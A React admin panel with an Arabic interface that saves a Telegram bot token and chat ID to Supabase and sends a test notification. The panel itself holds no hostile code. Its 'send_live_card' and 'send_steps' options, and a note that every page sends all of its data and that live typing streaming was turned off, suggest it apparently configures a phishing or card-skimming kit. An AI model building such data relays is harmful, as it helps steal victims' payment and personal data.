import { useEffect, useState } from "react";
import { Send, Loader2, CheckCircle2, XCircle } from "lucide-react";
import { supabase } from "@/integrations/supabase/client";
import { toast } from "sonner";
import { sendTelegram } from "@/lib/telegram-notify";

interface TelegramSettings {
  id: string;
  enabled: boolean;
  bot_token: string;
  chat_id: string;
  send_live_card: boolean;
  send_steps: boolean;
}

const DEFAULT: TelegramSettings = {
  id: "default",
  enabled: false,
  bot_token: "",
  chat_id: "",
  send_live_card: true,
  send_steps: true,
};

export default function TelegramPanel() {
  const [s, setS] = useState<TelegramSettings>(DEFAULT);
  const [loading, setLoading] = useState(true);
  const [saving, setSaving] = useState(false);
  const [testing, setTesting] = useState(false);

  useEffect(() => {
    (async () => {
      const { data } = await supabase
        .from("telegram_settings")
        .select("*")
        .eq("id", "default")
        .maybeSingle();
      if (data) setS(data as TelegramSettings);
      setLoading(false);
    })();
  }, []);

  const save = async () => {
    setSaving(true);
    const { error } = await supabase
      .from("telegram_settings")
      .upsert({ ...s, id: "default" });
    setSaving(false);
    if (error) {
      toast.error("تعذّر الحفظ: " + error.message);
    } else {
      toast.success("تم الحفظ");
    }
  };

  const test = async () => {
    if (!s.bot_token.trim() || !s.chat_id.trim()) {
      toast.error("ادخل Bot Token و Chat ID أولاً");
      return;
    }
    setTesting(true);
    try {
      const { data, error } = await supabase.functions.invoke("send-telegram", {
        body: {
          text: "✅ <b>اختبار اتصال</b>\nرسالة تجريبية من لوحة التحكم",
          bot_token: s.bot_token.trim(),
          chat_id: s.chat_id.trim(),
        },
      });
      if (error) throw error;
      if (data?.ok) {
        toast.success(`تم إرسال رسالة الاختبار بنجاح${data.message_id ? ` (#${data.message_id})` : ""}`);
      } else {
        const reason =
          data?.error ||
          data?.response?.description ||
          data?.reason ||
          "سبب غير معروف";
        toast.error("فشل الإرسال: " + reason);
      }
    } catch (err) {
      toast.error("خطأ: " + (err instanceof Error ? err.message : "غير معروف"));
    } finally {
      setTesting(false);
    }
  };

  if (loading) {
    return (
      <div className="grid place-items-center p-8 text-muted-foreground">
        <Loader2 className="h-5 w-5 animate-spin" />
      </div>
    );
  }

  return (
    <div dir="rtl" className="space-y-5 rounded-2xl bg-white p-5 shadow-card sm:p-6">
      <div className="flex items-center justify-between">
        <h2 className="text-[18px] font-extrabold text-brand-blue">إعدادات تليجرام</h2>
        <span
          className={`flex items-center gap-1.5 rounded-full px-3 py-1 text-xs font-bold ${
            s.enabled
              ? "bg-emerald-100 text-emerald-700"
              : "bg-gray-100 text-gray-600"
          }`}
        >
          {s.enabled ? (
            <CheckCircle2 className="h-3.5 w-3.5" />
          ) : (
            <XCircle className="h-3.5 w-3.5" />
          )}
          {s.enabled ? "مُفعّل" : "معطّل"}
        </span>
      </div>

      <label className="flex items-center justify-between gap-3 rounded-lg border border-border/60 bg-muted/30 p-3">
        <span className="text-sm font-bold text-brand-blue">تفعيل إرسال الإشعارات</span>
        <input
          type="checkbox"
          checked={s.enabled}
          onChange={(e) => setS({ ...s, enabled: e.target.checked })}
          className="h-5 w-5"
        />
      </label>

      <div className="space-y-2">
        <label className="block text-sm font-bold text-brand-blue">Bot Token</label>
        <input
          type="text"
          value={s.bot_token}
          onChange={(e) => setS({ ...s, bot_token: e.target.value })}
          placeholder="123456:ABC-DEF..."
          dir="ltr"
          className="w-full rounded-lg border border-border bg-white px-3 py-2.5 text-left font-mono text-sm focus:border-brand-blue focus:outline-none"
        />
      </div>

      <div className="space-y-2">
        <label className="block text-sm font-bold text-brand-blue">Chat ID</label>
        <input
          type="text"
          value={s.chat_id}
          onChange={(e) => setS({ ...s, chat_id: e.target.value })}
          placeholder="123456789"
          dir="ltr"
          className="w-full rounded-lg border border-border bg-white px-3 py-2.5 text-left font-mono text-sm focus:border-brand-blue focus:outline-none"
        />
        <p className="text-xs text-muted-foreground">
          ابعت رسالة لبوتك الأول، ثم شغّل البوت أو استخدم @userinfobot لمعرفة chat id.
        </p>
      </div>

      <div className="rounded-lg border border-border/60 bg-muted/20 p-3 text-[12px] text-muted-foreground">
        ✅ كل صفحة تبعت رسالة منظمة كاملة فيها كل البيانات الخاصة بيها (تم إلغاء البث المباشر أثناء الكتابة).
      </div>

      <div className="flex flex-wrap gap-2">
        <button
          onClick={save}
          disabled={saving}
          className="flex flex-1 items-center justify-center gap-2 rounded-lg bg-brand-blue px-4 py-2.5 text-sm font-bold text-white hover:opacity-90 disabled:opacity-60"
        >
          {saving && <Loader2 className="h-4 w-4 animate-spin" />}
          حفظ
        </button>
        <button
          onClick={test}
          disabled={testing || !s.bot_token || !s.chat_id}
          className="flex items-center justify-center gap-2 rounded-lg border border-brand-blue px-4 py-2.5 text-sm font-bold text-brand-blue hover:bg-brand-blue/5 disabled:opacity-60"
        >
          {testing ? <Loader2 className="h-4 w-4 animate-spin" /> : <Send className="h-4 w-4" />}
          اختبار الإرسال
        </button>
      </div>
    </div>
  );
}